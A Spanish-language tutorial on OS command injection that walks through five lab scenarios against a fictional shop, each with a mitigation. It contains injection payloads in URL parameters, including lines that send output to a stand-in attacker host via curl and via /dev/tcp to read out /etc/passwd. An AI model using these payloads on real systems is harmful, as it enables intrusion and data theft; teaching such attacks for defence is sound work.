Command Injection | Guía completa

Command Injection es una vulnerabilidad que permite a un atacante ejecutar comandos del sistema operativo en el servidor que aloja una aplicación web. Esta vulnerabilidad ocurre cuando la aplicación no valida adecuadamente las entradas del usuario y permite que se ejecuten comandos arbitrarios. Los ataques de Command Injection pueden llevar a consecuencias graves, como la ejecución de código malicioso, el robo de información sensible o incluso el control completo del servidor.


Lab #1: OS command injection, simple case
En este laboratorio, se presenta un caso simple de Command Injection. El objetivo es ejecutar un comando del sistema operativo en el servidor web. Por ejemplo, supongamos que la aplicación tiene una función de búsqueda que permite al usuario ingresar un término de búsqueda y luego ejecuta el comando ping en el servidor para verificar la conectividad. Un atacante podría aprovechar esto para ejecutar comandos maliciosos como:

http://www.ejemplotienda.com/search?term=8.8.8.8; ls -la
El comando ls -la se ejecutaría en el servidor junto con el comando ping, lo que permitiría al atacante listar el contenido del directorio y obtener información confidencial.

Solución: Para mitigar este tipo de vulnerabilidad, la aplicación debe validar y sanitizar adecuadamente las entradas del usuario. Se deben implementar medidas como la utilización de listas blancas de caracteres permitidos y la ejecución segura de comandos mediante el uso de funciones o bibliotecas específicas que eviten la inyección de comandos.

Lab #2: Blind OS command injection with time delays
En este laboratorio, se presenta un escenario de Command Injection ciego que no devuelve resultados directos en la respuesta de la aplicación. En lugar de eso, el atacante debe aprovechar retrasos en el tiempo para inferir la ejecución exitosa de un comando. Por ejemplo, supongamos que la aplicación tiene una función de envío de correos electrónicos que permite al usuario ingresar un mensaje y una dirección de correo electrónico. El atacante podría utilizar una inyección de comando para ejecutar un comando malicioso junto con un retraso en el tiempo, como:

http://www.ejemplotienda.com/contact?message=test&email=test@example.com; sleep 10
Si la aplicación demora aproximadamente 10 segundos en enviar el correo electrónico, el atacante puede inferir que el comando sleep 10 se ejecutó correctamente.

Solución: La solución para mitigar este tipo de vulnerabilidad implica una combinación de validación estricta de las entradas del usuario y el uso de técnicas de ejecución de comandos seguras que eviten la inyección de comandos. Además, se deben evitar retrasos innecesarios en la aplicación que puedan ayudar a los atacantes a inferir la ejecución exitosa de comandos.

Lab #3: Blind OS command injection with output redirection
En este laboratorio, se explora una variante de Command Injection ciego que redirige la salida del comando a una ubicación controlada por el atacante.En la web ficticia "ejemplotienda.com", supongamos que la aplicación permite a los usuarios cargar imágenes de perfil y luego redimensionarlas utilizando un comando del sistema operativo. El atacante podría aprovechar esto para ejecutar comandos maliciosos y redirigir la salida a una ubicación controlada por él, como:

http://www.ejemplotienda.com/upload?image=test.jpg; ls -la > /var/www/html/attacker/output.txt
El comando ls -la se ejecutaría en el servidor y la salida se redirigiría al archivo /var/www/html/attacker/output.txt. De esta manera, el atacante puede obtener información confidencial y controlar el destino de la salida.

Solución: Para mitigar este tipo de vulnerabilidad, es fundamental que la aplicación realice una validación y sanitización rigurosas de las entradas del usuario. Además, se deben utilizar funciones o bibliotecas seguras para la ejecución de comandos, evitando la inyección de comandos y la redirección no controlada de la salida.

Lab #4: Blind OS command injection with out-of-band interaction
En este laboratorio, se presenta una variante de Command Injection ciego que interactúa con el atacante a través de canales alternativos. Por ejemplo, supongamos que la aplicación tiene una función que realiza una llamada al sistema operativo y envía un mensaje de confirmación al atacante a través de una solicitud HTTP a un servidor controlado por él. El atacante podría utilizar una inyección de comando para ejecutar comandos maliciosos y enviar los resultados a través de una solicitud HTTP a su servidor, como:

http://www.ejemplotienda.com/execute?command=ping -c 5 8.8.8.8; curl http://attacker-server.com/notify?result=executed
El comando ping -c 5 8.8.8.8 se ejecutaría en el servidor y los resultados se enviarían al servidor del atacante a través de la solicitud HTTP.

Solución: Para mitigar esta vulnerabilidad, se debe implementar una validación estricta de las entradas del usuario, asegurando que no se permitan caracteres o comandos maliciosos. Además, se deben evitar interacciones no controladas con sistemas externos y restringir las conexiones salientes desde la aplicación.

Lab #5: Blind OS command injection with out-of-band data exfiltration
En este laboratorio, se explora otra variante de Command Injection ciego que permite al atacante exfiltrar datos a través de canales alternativos. Supongamos que la aplicación tiene una función que ejecuta comandos del sistema operativo y muestra los resultados en una página de administración. El atacante podría utilizar una inyección de comando para exfiltrar datos a su servidor controlado, como:

http://www.ejemplotienda.com/admin?command=cat /etc/passwd > /dev/tcp/attacker-server.com/80
El comando cat /etc/passwd se ejecutaría en el servidor y los resultados se enviarían al servidor del atacante utilizando una conexión TCP saliente.

Solución: Para mitigar esta vulnerabilidad, se deben implementar medidas de seguridad como la validación exhaustiva de las entradas del usuario y el uso de funciones seguras para la ejecución de comandos. Además, se deben limitar las conexiones salientesdesde la aplicación y monitorear las comunicaciones de red en busca de actividad sospechosa.
